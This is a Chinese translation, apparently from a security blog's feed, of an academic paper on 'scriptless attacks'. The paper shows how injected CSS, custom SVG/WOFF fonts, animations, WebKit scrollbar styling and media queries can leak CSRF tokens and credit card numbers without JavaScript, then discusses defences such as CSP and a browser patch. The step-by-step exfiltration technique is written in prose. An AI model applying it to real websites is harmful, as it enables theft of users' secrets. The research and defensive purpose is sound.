OS设备。</p><p>Webkit项目作为开源运行，以非常短的开发周期和快速实现新的W3C和WHATWG功能建议而闻名。除了这些指定和推荐的功能外，Webkit还提供了各种非标准功能，这些功能仅在使用此特定布局引擎的浏览器中提供。</p><p>其中一项专有功能使攻击者能够提供棘手的攻击，对允许提交用户生成的样式的网站起作用。可以提取网站显示的几乎任意信息，包括信用卡号，元素维度等文本内容，甚至HTML/XHTML属性值，例如用于保护非幂等HTTP请求的CSRF令牌。一旦使用3.1节中描述的CSS内容功能，后者就成为可能。</p><p>我们开发了一个能够提取CSRF令牌详细信息的演示漏洞;举一个例子，测试显示读取32个字符的CSRF令牌需要少于100个HTTP请求。</p><p>如上所述，CSRF令牌被希望保护可能有害的GET请求的网站使用。如果攻击者可以发现链接以启动对存储项的修改，则可以通过从其他浏览器导航选项卡向该链接发出HTTP请求来完成损害。一个不可思议的链接(应用了长而加密的安全令牌)可以防止这种攻击。必须知道令牌才能成功执行请求。在允许攻击者执行任意JavaScript的攻击场景中，通过简单的DOM遍历到其中一个受保护链接并随后利用侧通道将令牌发送到域外位置以便以后重新使用，很容易提取令牌。但是在我们的攻击场景中，攻击者无法执行JavaScript，因此令牌提取和泄露（除了使用开放的textarea元素和表单提交之外）很复杂。</p><p>Vela等人在2009年使用属性选择器创建了一个示范性的<a href="http://eaea.sirdarckcat.net/cssar/v2/" target="_blank" rel="noopener">重载CSS属性读取器</a>。不幸的是，这种方法不适合读取高熵32+字符的CSRF令牌。</p><p>为了实现纯粹的基于CSS的数据泄露攻击，我们利用3.1节中列出的所有可用功能，另外将它们与专有Webkit功能之一相结合。<strong>以下概述介绍了我们从初始CSS注入转移到敏感CSRF令牌的完整堆栈数据泄漏的步骤：</strong></p><ul><li><p>攻击者注入一个包含一组CSS选择器和一个font-face声明的样式元素。这些CSS选择器选择CSRF令牌保护链接（CTPL）及其容器元素。 font-face声明导入一组经过精心准备的SVG字体：对于可出现在CSRF令牌中的每个字符，都会导入一个字体文件。除导入的字体外，任何其他字符的宽度均为零。每个具有宽度的字体的单个特定字符应用具有独特宽度值。</p></li><li><p>CSS动画块与前面提到的CSS一起注入。此动画以CTPL的容器为目标，并将其从初始大尺寸缩小到特定的最终尺寸。确定最终尺寸至关重要;攻击者需要找出动画停止泄漏有关收缩容器所包含内容的信息的正确像素大小。</p></li><li><p>注入的CSS包含由CTPL的:: before伪选择器嵌入的内容属性。此内容属性应用值attr（href）。<br>因此，攻击者可以将href属性的值映射到DOM并使其可见。通过这样做，可以应用注入的SVG字体。对于每次出现的CTPL，都可以选择不同的SVG字体。在第一个选定的链接中，将选择仅为字符a提供维度的字体。对于第二个CTPL出现，将选择仅为字符b提供维度的字体，依此类推。接下来，所有CTPL都可以使用单独的字体，而连接到指定字体的字符的所有CTPL都将没有任何维度。最后，包含由所选字体标注的字符的所有CTPL将具有以像素为单位的字符宽度×出现的维度。</p></li><li><p>通过将CTPL的容器元素的框大小从100％减小到一个像素，攻击者可以唤起一个有趣的行为：该框对于CTPL来说太小了，因此应用维度的字符将突破到下一行。如果该框具有不同的高度且没有水平溢出属性，则会出现滚动条。滚动条出现的那一刻构成攻击者在本地确定正在使用的字符的开口：特定的SVG字体，零宽度字符和通过像素精确动画强制减少框大小的滚动条就足够了。</p></li></ul><p>最终，攻击者可以在本地确定角色是否具有唯一的尺寸，因此存在于CTPL中。无法远程确定此角色的唯一障碍是缺少适用于滚动条的反向通道。没有标准化的方法将背景图像或类似属性应用于滚动条。<br>Webkit  - 所有其他经过测试的浏览器布局引擎中的例外 - 提供此功能。开发人员可以选择窗口或HTML元素滚动条的任何组件，并应用几乎任意的样式。这包括框阴影，圆角边框和背景图像。但是，我们的调查显示，页面加载后会直接请求典型的滚动条背景图像。因此，该属性对于定时目的和侧通道的开发似乎是无趣的，所述侧通道获得关于出现时间或纯粹存在的信息。尽管如此，对Webkit可用伪类和状态选择器的进一步研究揭示了一种工作方式，即将滚动条状态与背景图像结合使用，以实现实际定时和测量攻击。若干状态选择器允许分配背景图像，并且基于该事实，必须实际发生特定状态（诸如影响滚动条轨道的背景的递增滚动）。此时，后台将在进入此CSS选择状态时加载，而不是在页面加载时加载。这允许对手确实使用滚动条外观的测量来进行定时和侧通道数据泄漏。</p><p>清单2中显示的CSS代码示例演示了一个能够作为辅助通道工作的状态选择器。<br>在我们基于Webkit滚动条功能的测试期间，确定敏感内容只需几秒钟。如果执行CSS动画，受害者不一定会注意到恶意性质。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB2.png" alt="此处输入图片的描述"></p><p>我们在http：// html5sec上创建了一个公共测试用例。<br>org / webkit / test在Google Chrome开发团队负责任地披露问题后，展示了这种侧向引导攻击。为了缓解这种攻击，我们建议平等对待滚动条背景和滚动条状态背景;应在页面加载期间加载所有背景图像和类似的外部资源，而不是在外观或状态发生时加载。这两个方面创建了一个攻击窗口，允许侧面信道攻击和外观探测可用于泄漏敏感数据和页面参数，如上文所述的攻击所示。</p><p>将一般攻击技术与在受攻击网站上显示信用卡号的运行示例相连接，注入的字体将为信用卡号的每个数字组提供一个连字。要创建包含强制信用卡号码所需的所有可能数字组的WOFF字体，需要不超过9,999或999,999个不同的连字数量，具体取决于信用卡制造商。然后，每个数字组将具有不同的宽度，因此可以通过确定在缩小尺寸的动画过程期间何时出现滚动条来确定该数字组。我们在示例场景中成功测试了这种方法，发现我们可以可靠地确定和泄露这些信息。</p><h3 id="使用滚动条检测和媒体查询进行内容渗透"><a href="#使用滚动条检测和媒体查询进行内容渗透" class="headerlink" title="使用滚动条检测和媒体查询进行内容渗透"></a><strong>使用滚动条检测和媒体查询进行内容渗透</strong></h3><p>在我们研究Webkit特定滚动条数据泄漏功能的过程中，我们尝试开发一种技术，可以通过标准化功能在任何其他浏览器中完成类似的结果。此外，提取单个字符可能会成为一项持久的任务，对于有效的针对性攻击而言并非最佳。因此，我们的目标是继续研究具有更大影响的攻击技术，与上面提到的相当具体的“智能滚动条”方法相比，总体上更有效，更通用。请注意，如果不深入了解攻击面和可能的影响，以及所涉及的特征和对手，第4节中讨论的有效防御即使不是不可能也是复杂的。</p><p>我们利用前面提到的部署CSS媒体查询的技术来提升基于滚动条的数据泄漏，使其适用于所有现代浏览器。它还有助于分离核心问题，从一个小的实现怪癖转变为代表一个实际的基于设计的安全问题。如3.1节所述，媒体查询允许确定设备的视口大小。</p><p>基于此判断过程，他们部署了各种最有可能优化的CSS文件和规则。要让滚动条成为数据泄漏问题的来源，如3.2节中的上述攻击所述，攻击者需要找出滚动条出现的时间和原因。更具体地说，攻击者可以调整元素直到特定点，并使用滚动条来确定元素是否包含具有不同值的某个其他元素或文本节点。如果滚动条存在与否，CSS Media Queries将帮助推出实际部分。以下步骤演示了如何使用CSS Media Queries检测滚动条存在的详细信息：</p><ul><li><p>一个网站部署了一个嵌入另一个网站的Iframe。恶意准备的CSS注入是此嵌入式网站的一部分。 iframe设置为100％的宽度，因此填充整个嵌入窗口的宽度 - 特征。 iframe的高度可以设置为任意值，具体取决于应泄漏的数据。</p></li><li><p>嵌入网站设置为特定宽度。这将确保，如果Iframe的宽度为100％，嵌入式站点将遵循该宽度并相应地设置其视口尺寸。框架/嵌入式网站使用注入的CSS媒体查询来部署两个状态。第一个状态使用与嵌入页面几乎相同的宽度。考虑宽度为430px的框架视口，然后框架网站的第一个媒体查询将侦听设备视口宽度为400px。第二个CSS媒体查询现在将侦听设备视图端口宽度为390px。请注意，一旦Iframe仅将宽度减小十个像素，400px的媒体查询将不再匹配。同时，应激活第二个媒体查询并部署其指定的样式，包括背景图像请求等。</p></li><li><p>下一步，嵌入注入站点的Iframe的高度将会改变。这可以通过CSS动画和特定于Webkit的信息泄漏，在托管Iframe的网站上运行的脚本，或者在攻击者生成弹出窗口或在编辑模式中显示的Iframe的情况下手动调整大小来执行;如果主机站点在编辑模式下显示Iframe，则单击并拖动操作将完成调整大小（考虑用于社交工程的浏览器游戏场景）。</p></li></ul><p>CSS动画仍然是最不可能不需要任何用户交互的情况。一旦Iframe的高度降低，大小更改将强制其内容换行。就其本身而言，这条断开线将生成一个垂直滚动条，该滚动条由注入的溢出行为或简单的窗口默认值强制执行。<br>滚动条将占用大约10-15个像素，从而将视口大小从400减小到390或更小的像素宽度。这将触发第二媒体查询并且可以显示背景图像，并行地泄漏换行的确切位置和时间，滚动条外观以及由此包含的信息的宽度和性质。这最终确定了攻击，并将上述功能与CSS Media Queries的组合分类为另一个潜在的信息泄漏。图1中的屏幕截图说明了这种情况。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB3.png" alt="此处输入图片的描述"></p><p>同样，我们在<a href="http://html5sec.org/scrollbar/test上创建了一个公共测试用例，以演示滚动条存在的无脚本确定。要启动测试，必须首先调整窗口的大小，然后以将其下边界拖向上边界的方式手动减小高度。请注意，这当然可以跨域自动完成。" target="_blank" rel="noopener">http://html5sec.org/scrollbar/test上创建了一个公共测试用例，以演示滚动条存在的无脚本确定。要启动测试，必须首先调整窗口的大小，然后以将其下边界拖向上边界的方式手动减小高度。请注意，这当然可以跨域自动完成。</a></p><p>要将此攻击技术与我们的运行示例相结合，我们只需使用缩小大小的弹出窗口或iframe来确定何时可见内容大小被削弱并导致滚动条出现。此时，整体视图大小也将减小，并通过让CSS媒体查询通过（例如）背景图像发起HTTP请求来引起侧信道的出现。请注意，这次我们不需要利用定时攻击：媒体查询CSS提供有关滚动条出现的像素宽度的详细信息。将该信息与替换信用卡号的上下文连字的已知不同宽度相结合，可以产生详细且精确的侧通道攻击。</p><h3 id="使用上下文替代建立字典字体"><a href="#使用上下文替代建立字典字体" class="headerlink" title="使用上下文替代建立字典字体"></a><strong>使用上下文替代建立字典字体</strong></h3><p>为了加快在注入的网站上识别和确定特定字符串和子字符串的过程，攻击者可能需要大量不同的字体和请求。上述攻击样本被描述为能够从注入的网站中提取单个字符。为了提高效率，攻击者可以使用SVG和WOFF字体提供的自由选择或上下文替代。通过注入包含数十万个字符串组合的字典的跨域字体，可以大大加快检测过程。</p><p>注意，每个字符串表示的字符信息可以是小的：字体使用矢量图形，并且提供不同宽度的检测特征所需的全部可以由包括两个单个点的路径包含。在一个大小为1兆字节的单个字体文件中，攻击者可以存储大量依赖于所表示字符串性质的上下文备选方案。对于数值的数据泄漏（例如，为了能够泄漏信用卡号或类似信息），攻击字体的尺寸可以更小并且仍然容易发现并表示信用卡号包括的单个块。创建攻击字体所需的工具可免费提供给合法使用;用于创建包含字典的SVG字体，简单的文本编辑器就足够了。将字体压缩为SVGZ（压缩SVG）格式以优化大小需要简单的gzip实现。对于编辑和滥用WOFF字体，<a href="http://fontforge.sourceforge.net/上提供的免费和开放textttFontForge工具可以很容易地使用。" target="_blank" rel="noopener">http://fontforge.sourceforge.net/上提供的免费和开放textttFontForge工具可以很容易地使用。</a></p><p>我们的研究结果表明，字体注入可能会对未来的攻击格局产生积极影响。<br>虽然CSP和NoScript默认防止跨域字体注入，但我们需要监视公共字体API的使用。这是因为它们可能被滥用并提供攻击字体，绕过基于白名单的过滤器和保护工具。<br>通过这样做，他们将破坏用户对Google W ebFonts和TypeKit等提供商的信任，这两者都是免费的Web字体部署服务。</p><h2 id="缓解技术"><a href="#缓解技术" class="headerlink" title="缓解技术"></a><strong>缓解技术</strong></h2><p>在本节中，我们将分析现有的攻击缓解技术，以确定网站所有者和开发人员可以在多大程度上防范无脚本攻击。承认无脚本攻击的广泛可能性（本出版物仅讨论了两种可能更多的攻击变体），我们得出结论，需要多层保护才能有效地和整体地防御基于CSS，SVG和HTML的数据泄漏。</p><h3 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略(CSP)"></a><strong>内容安全策略(CSP)</strong></h3><p>CSP最初由Mozilla开发，现在由W3C Web应用程序安全工作组指定为草案。 CSP的主要目标是通过将至少一个域确定为脚本代码的有效源来缓解跨站点脚本等内容注入漏洞。要实现这一目标，可以使用frame-src或sandbox等指令。举一个例子，在frame-src的情况下，可以让支持用户代理检查哪些帧可以嵌入到网站中。因此，可以在可控制的网站上获得关于允许内容的精细粒度。因此，CSP能够减少恶意代码注入攻击的潜在有害影响。请注意，CSP认为任意样式，内联CSS和Web字体都可能有害，因此提供了匹配规则。</p><p>在我们的无脚本攻击环境中，最好限制基本先决条件，以防止网页（或更确切地说是用户）受到攻击。因此，我们分析了针对我们在本文中介绍的攻击的给定CSP指令。首先，我们发现W3C草案的几乎所有指令，除了用于报告策略违规的指令报告 - uri，都有助于防止网站及其用户受到攻击者的影响。指令default-src强制用户代理执行 - 除了一个例外 - 草案的剩余指令以及指令值的给定默认源。在详细了解default-src影响指令之前，重要的是要知道CSP无法检测到带有脚本或样式表代码的纯注入到易受攻击的Web页面中。因此，只能阻止从外部资源加载的文件的内容。</p><p>这导致能够阻止外部文件中包含的恶意内容。看看我们的攻击表明，至少使用CSP的style-src和img-src来进一步减少攻击面是有意义的。通过使用stylesrc指定受保护Web页面的样式，可以限制对不需要的CSS文件的访问。因此，用于读取DOM节点的基于CSS的动画或CSS内容属性的使用在这种情况下将不再用作攻击工具。这同样适用于img-src;如前所述，SVG文件可用于执行无脚本攻击和拦截事件，击键和类似的用户交互，而无需使用脚本技术。</p><p>因此，建议从其他站点（尤其是其他域）阻止SVG文件，以实现更高级别的安全性。基于我们的示例攻击，我们还建议使用frame-src来限制嵌入帧的资源以及用于限制外部字体源的font-src。</p><p>一旦通过限制外部文件资源来提高安全性的可能性已经明确，我们将留下以下考虑：可以限制受保护站点内可能的攻击向量吗？当我们使用sandbox作为不受default-src控制或设置的指令时，就是这种情况。它根据HTML5沙箱属性值限制可用内容。因此，该指令可用于例如停用脚本的执行;因此，基于JavaScript的攻击将无法运行。什么不被认为是危险的是无脚本代码。在我们的例子中，如果遇到典型的脚本攻击，沙箱会很有帮助。</p><p>总之，我们得出结论，CSP是朝着正确方向迈出的一小步和有益的一步。它特别有助于消除可用的侧通道以及一些攻击向量。在我们在第1节中描述的攻击模型中，CSP因此有助于减轻前提条件1并消除前提条件3.然而，它不足以完全覆盖各种无脚本攻击。我们建议的是增加CSP设置的范围，以便至少有一个选项禁止执行样式表或 - 甚至更好 - 选择样式表属性。</p><p>CSP的报道还有一件事仍然存在：与点击劫持相关的行为。我们在3.3节中讨论的滚动条检测依赖于弹出窗口，以防被攻击的网站使用帧破坏程序。与可用的帧检测和破坏功能相反，现代浏览器中没有可靠的方法来实现弹出窗口和分离视图的相同安全性。因此，在4.2节中，我们提出了针对无脚本攻击和类似威胁的其他保护机制。</p><h3 id="检测分离视图"><a href="#检测分离视图" class="headerlink" title="检测分离视图"></a><strong>检测分离视图</strong></h3><p>我们在第3节中描述的一些攻击可以通过使用Iframe和类似的内容框架技术来利用。然而，通过简单地使用适当的X-Frame-Options标头，网站可以轻松部署防御性测量。知道这种防御技术的攻击者已经开始利用不同的方式利用弹出窗口和分离视图来完成数据泄漏攻击，甚至点击劫持攻击，而不受帧破坏代码和X-Frame-Options的影响头。</p><p>其中一些攻击已在双击劫持标签下进行了记录，而其他技术则涉及将活动内容（如applet）或复制和粘贴操作拖放到跨域的可编辑内容区域中。由于扩展的攻击面，我们要强调的是，就现代浏览器而言，网站没有可行的方法来确定它是否在分离的视图中加载相应的弹出窗口。</p><p>为了解决这个问题，我们为最新版本的Web浏览器Firefox（Nightly14.0a1，截至2012年4月提供）创建了一个补丁，提供了一种可能的解决方案来防止所描述的攻击。该补丁通过两个附加属性扩展了众所周知的DOM窗口对象：isPopup和loadedCrossDomain。这两个属性都由布尔值表示，任何网站都可以随时以只读方式访问。正如命名已经暗示的那样，只有当前DOM窗口对象表示的实际GUI窗口是分离视图时，window.isPopup才为真。同样，仅当跨域加载当前DOM窗口对象时，window.loadedCrossDomain才为true。</p><p>这些功能使网站能够使用简单的JavaScript代码检查自己的状态。</p><p>随后，在不安全的情况下，可以采取适当的对策。例如，网站可以通过限制自身以跨域方式或在iframe内部加载到分离视图中来保护自己免受第3节中描述的攻击。虽然后者已经可以在现代浏览器中开箱即用（通过将X-Frame-Options标题设置为SAMEORIGIN或DENY），但前者不能。幸运的是，我们可以通过Firefox浏览器的自定义扩展轻松实现，如下面的清单3所示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB4.png" alt="此处输入图片的描述"></p><p>该补丁包含C++类nsGlobalWindow和nsWindowWatcher以及Firefox代码库的nsIDOMWindow和nsIWebBrowserChrome接口中的更改。虽然isPopup属性可以通过检查某个已存在的内部窗口标志直接实现，但loadedCrossDomain属性的引入需要额外的代码。每当网站尝试打开新窗口时，此代码会将调用网站的URI的主机名与要加载的网站的主机名（包括端口）进行比较。如果主机名不同，则设置新引入的内部标志以指示此条件，反之亦然，在相反情况下未设置此标志。因此，如果Firefox浏览器重用已存在的弹出窗口以在弹出模式下显示新网站，则loadedCrossDomain属性也会正确更新。</p><p>允许网站确定是否在分离视图中加载，可以立即缓解多种攻击技术。这包括上述几种无脚本攻击，双击劫持，拖放以及多次复制和粘贴攻击。我们计划与不同的浏览器开发团队讨论这个补丁，并评估几种浏览器如何采用这种技术来保护用户免受攻击。</p><h3 id="其他防御技术"><a href="#其他防御技术" class="headerlink" title="其他防御技术"></a><strong>其他防御技术</strong></h3><p>无脚本的攻击可能发生在过多的变化中，并且通常基于其他良性特征的恶意连接。到目前为止，我们已经详细阐述了如何加强浏览器并为网站所有者提供新的杠杆，以最小的努力加强他们的应用程序。此外，我们通过为图像，字体，CSS和其他资源定义严格的原始策略，通过从不同来源请求数据来潜在地导致信息泄漏，从而阐明了CSP如何帮助防止无脚本攻击。</p><p>Zalewski等。讨论了2011年无脚本攻击的另一个方面，指向悬空开放标签，更具体地说，用于数据泄漏的按钮，文本区域和半开图像src属性等元素。这些攻击简单而有效，需要Web应用程序和最终的HTML过滤技术来应用语法验证并强制执行用户生成的（X）HTML内容的语法有效性。开放的textarea可以轻松地将网站的其余部分转换为其自己的内容，从而泄露敏感数据和CSRF令牌。请注意，通过将点击坐标发送到跨域的任意接收器，即使是图像映射和类似的弃用技术也可用于无脚本数据泄漏。除了前面提到的保护技术和机制之外，经典的HTML内容和语法验证与Zalewski创造的同样重要，它可以防止“后XSS世界”中的攻击。请注意，这是一个类似于我们在本文中检查过的攻击者模型。消除侧通道而不是攻击向量对于解决该特定问题同样更重要。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><p>安全社区的成员已经对Web应用程序的攻击给予了很多关注。我们现在将回顾这一领域的相关工作，并讨论无脚本攻击的新方面和贡献。</p><h3 id="历史嗅探"><a href="#历史嗅探" class="headerlink" title="历史嗅探"></a><strong>历史嗅探</strong></h3><p>从概念的角度来看，基于CSS的浏览器历史嗅探与我们的工作密切相关。该技术使对手能够确定用户过去访问过哪些网站。多年来，历史嗅探记录在几个浏览器错误报告中。该方法已用于不同的攻击场景。在一项实证研究中，Jang等人发现几个热门网站实际上使用这种技术来泄露有关访问者浏览行为的信息。鉴于此攻击媒介的普遍存在，最新版本的常见Web浏览器已实施某些防御措施，以保护用户免受基于CSS的历史嗅探。</p><p>我们也使用CSS作为攻击的一部分，但我们不使用历史嗅探背后的实际概念。更具体地说，我们演示了攻击者如何滥用基于CSS的动画，CSS内容属性和CSSMedia查询来访问和收集特定信息。</p><p>因此，我们的攻击也会对最新版本的流行Web浏览器起作用。必须要注意的是，虽然许多记录的历史嗅探攻击在使用JavaScript来泄露数据时明显更快，但这些攻击也可以仅基于CSS实现，而且没有活动脚本代码，这反过来又根据我们的定义将它们区分为无脚本攻击。</p><h3 id="时间攻击"><a href="#时间攻击" class="headerlink" title="时间攻击"></a><strong>时间攻击</strong></h3><p>Felten和Schneider在网络安全的背景下提供了一种更为一般的历史嗅探攻击形式，他分析了与资源是否被缓存相关的时序差异。在类似的攻击中，Bortz和Boneh展示了如何实现定时攻击以从Web应用程序中恢复私人信息。最近，陈等人。展示了与流行网站相关的不同侧通道泄漏，并且还基于时序信息。在其他领域，定时攻击是一种完善的技术，用于从许多不同类型的系统（例如，OpenSSL，SSH 或虚拟机环境）中泄露信息。</p><p>虽然定时测量被用作本文所述的攻击的一部分，但我们利用其他类型的定时攻击，并使用此一般概念来确定Web浏览器上下文中的特定信息。</p><h3 id="客户端和服务器端XSS检测或预防"><a href="#客户端和服务器端XSS检测或预防" class="headerlink" title="客户端和服务器端XSS检测或预防"></a><strong>客户端和服务器端XSS检测或预防</strong></h3><p>由于其高实用率，XSS攻击已被专门的大量研究所涵盖。我们现在将简要讨论发现和防止此类攻击的不同客户端和服务器端方法。请注意，由于其不同的基本原则，它们在无脚本攻击的情况下的有效性受到限制。<br>贝茨等人研究能够阻止XSS的客户端过滤方法。他们在noXSS，NoScript和IE8 XSS过滤器中发现了缺陷，并且发 现一些攻击向量仅在XSS过滤后被激活。与其他方法相比，它们倾向于将XSSAUDITOR放在HTML解析器和JavaScript引擎之间。但是，这种设计不会阻止无脚本攻击，因为它们不针对JavaScript引擎。</p><p>Curtsinger等提出了一个名为ZOZZLE的浏览器扩展，用于对带有贝叶斯分类的恶意JavaScript代码进行分类。如果这种基于学习的防御机制能够对抗无脚本攻击，那么这仍然是一个悬而未决的问题</p><p>Pietraszek等人介绍了上下文敏感的字符串评估（CSSE），这是一个通过依赖一组元数据来检查传入的用户生成数据字符串的库</p><p>根据从附加元数据派生的上下文，正在应用不同的过滤和转义方法来保护现有应用程序。这种低级方法被描述为对现有应用程序可操作，几乎不需要应用程序开发人员实施。</p><p>Kirda等。提出了一个名为Noxes的客户端XSS预防工具。通过防止浏览器联系不属于Web应用程序域的URL，此工具可防止攻击者将敏感数据泄露给其服务器。从概念的角度来看，这种方法也可以用来限制对手可以通过无脚本攻击实现的目标，因为它可以防止侧通道泄露被盗信息。此外，作者根据攻击者可以选择的编码和混淆技术的多种方式，详细阐述了服务器端XSS检测和预防的难点。以类似的方式，我们认为无法在服务器端阻止无脚本攻击。</p><p>吉姆等人。引入了浏览器强制嵌入式策略（BEEP)，这是一种策略驱动的浏览器扩展，能够控制某个脚本是否可以执行。</p><p>更具体地说，BEEP使用户能够将合法脚本列入白名单并禁用网页的某些区域的脚本。整个概念代表了CSP的另一个基础。 Nadji等人。提出了类似的方法：文档结构完整性（DSI）确保动态内容与服务器端的静态内容分离，而两者在客户端以完整性保留方式组合。</p><p>Louw和Venkatakrishnan的蓝图遵循类似的方法：服务器端应用程序将内容编码为模型表示，可以由工具的客户端部分处理。 </p><p>Saxena等介绍了ScriptGuard，一种上下文敏感的XSS卫生工具，能够自动进行上下文检测和一致的卫生例程选择。请注意，所有这些方法都侧重于防止代码脚本，这意味着无脚本攻击可能会绕过这种保护机制，因为我们不使用动态内容。</p><p>Heiderich等。发布了由SVG图形绕过现代HTML清理程序引起的XSS漏洞以及在浏览器恶意软件和复杂的跨上下文脚本攻击的情况下基于DOM的攻击检测。</p><p>Martin和Lam 以及Kieyzun等人引入了能够自动生成针对Web应用程序的XSS和SQL注入攻击的工具。 XSSDS 是一个通过比较HTTP请求和响应来确定攻击是否真正成功的系统。在最近的论文中，提供了发现参数注入和参数篡改漏洞的不同方法。这些类型的工具尚不可用于自动发现和创建无脚本攻击，尽管我们期望可以识别类似的概念并将其应用于将来适当一致的工具开发。</p><h2 id="总结和展望"><a href="#总结和展望" class="headerlink" title="总结和展望"></a><strong>总结和展望</strong></h2><p>在本文中，我们介绍了一类针对Web应用程序的攻击，我们将其称为无脚本攻击。这些攻击的关键属性是它们不依赖于JavaScript（或任何其他语言）代码的执行。相反，它们完全基于现代用户代理中可用的标准浏览器功能，并在当前的HTML和CSS3规范草案中定义。在某种程度上，这种攻击可以看作是基于CSS的历史偷窃和类似攻击向量的概括。我们讨论了几种对无脚本攻击有用的浏览器功能，包括攻击者可以访问信息或建立辅助通道的各种方式。此外，我们针对示例性Web应用程序提出了几种无脚本攻击，并演示了攻击者如何通过滥用合法的浏览器概念成功获取敏感信息，如CSRF令牌或用户输入。此外，我们还发现攻击者还可以泄露特定信息并建立使这种攻击可行的辅助渠道。</p><p>虽然本文中讨论的攻击可能并不代表非法检索敏感用户数据的全部方法，但我们认为我们讨论的攻击组件对其他攻击媒介非常重要。因此，详细分析和进一步详细阐述与可能的防御机制有关的调查可能会产生更多的攻击媒介。我们希望本文能够刺激针对不依赖于JavaScript代码执行的Web应用程序的攻击。</p><p>作为另一个贡献，我们引入了一个浏览器补丁，使网站能够确定它是否在分离视图或弹出窗口中加载，展示了针对多种攻击的缓解技术。在我们未来的工作中，我们将研究更多处理和防止无脚本攻击的方法。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="https://www.ei.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf" target="_blank" rel="noopener">https://www.ei.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;&lt;strong&gt;摘要&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;由于其高实际影响，跨站点脚本（XSS）攻击引起了安全社区成员的广泛关注。同样，提出了过多或多或少有效的防御技术，解决了XSS漏洞的原因和影响。因此，攻击者通常无法在多个现实场景中注入甚至执行任意脚本代码。&lt;/p&gt;
&lt;p&gt;在本文中，我们研究了在XSS之后仍然存在的攻击面，并且通过阻止攻击者执行JavaScript代码来减少类似的脚本攻击。我们解决了攻击者是否真的需要JavaScript或类似功能来执行针对信息窃取的攻击的问题。令人惊讶的结果是&lt;strong&gt;，攻击者还可以滥用层叠样式表（CSS）与其他Web技术（如纯HTML，非活动SVG图像或字体文件）一起使用&lt;/strong&gt;。通过几个案例研究，&lt;strong&gt;我们引入了所谓的无脚本攻击&lt;/strong&gt;，并证明攻击者可能不需要执行代码从受到良来好保护的网站中提取敏感信息。更确切地说，&lt;strong&gt;我们表明攻击者可以使用看似良性的功能来构建侧通道攻击&lt;/strong&gt;，以测量和泄露给定网站上显示的几乎任意数据。&lt;/p&gt;
&lt;p&gt;我们在本文结束时讨论了针对此类攻击的潜在缓解技术。此外，我们还实施了一个浏览器补丁，使网站能够做出关于在分离视图或弹出窗口中加载的重要决定。这种方法证明对于防止我们在此讨论的某些类型的攻击很有用。&lt;/p&gt;
    
    </summary>
    
      <category term="翻译" scheme="https://www.k0rz3n.com/categories/%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="XSS" scheme="https://www.k0rz3n.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>论白名单的不安全性与内容安全策略的未来(半机翻有删增)</title>
    <link href="https://www.k0rz3n.com/2019/03/07/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A5(%E5%8D%8A%E7%BF%BB%E8%AF%91%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <id>https://www.k0rz3n.com/2019/03/07/论白名单的不安全性与内容安全政策的未来(半翻译有删增)/</id>
    <published>2019-03-07T15:11:18.000Z</published>
    <updated>2019-04-28T14:08:45.217Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>内容安全策略是一种Web平台机制，旨在<strong>缓解</strong>现代Web应用程序中的顶级安全漏洞跨站点脚本（XSS)。在本文中，我们仔细研究了采用CSP的实际好处，并在实际部署中识别出重要的aws，导致所有不同策略的94.72％被绕过。</p><p>我们的互联网范围内的分析基于来自超过10亿个主机名的大约1000亿页的搜索引擎语料库;结果涵盖了1,680,867个主机上的CSP部署，以及26,011个独特的CSP策略(迄今为止最全面的研究)。我们介绍了CSP规范的安全相关方面，并对其威胁模型进行了深入分析，重点关注XSS保护。</p><p>我们确定了<strong>三种常见的CSP绕过类并解释了它们如何破坏策略的安全性。</strong></p><p>然后，我们转向对因特网上部署的策略进行定量分析，以了解其安全性。我们观察到15个域中最常用于加载脚本的白名单中有14个包含不安全的端点;因此，<strong>75.81％的不同策略使用允许攻击者绕过CSP的脚本白名单</strong>。总的来说，我们发现<strong>94.68％的试图限制脚本执行的策略是无效的，99.34％的CSP主机使用的策略对预防XSS没有好处</strong></p><p>最后，<strong>我们提出了 “strict-dynamic” 关键字</strong>，这是对规范的补充，<strong>有助于创建基于加密nonces的策略</strong>，而不依赖于域白名单。我们讨论了<strong>在复杂应用程序中部署这种基于随机数的策略的经验</strong>，并为Web开发者提供了改进其策略的指导。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><a id="more"></a><p>XSS — 